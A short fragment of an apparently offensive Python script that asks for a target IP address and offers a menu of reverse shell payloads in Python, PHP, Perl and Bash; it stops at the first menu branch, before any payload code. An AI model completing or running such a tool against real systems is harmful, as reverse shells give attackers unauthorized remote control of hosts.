import requests
import sys
import os
import threading
import socket


print("Enter target IP address: ")
target = input()
print("Specify the payload type: ")
print("1. Python Reverse Shell")
print("2. PHP Reverse Shell")
print("3. Perl Reverse Shell")
print("4. Bash Reverse Shell")
print("5. Exit")
choice = input()
if choice == "1":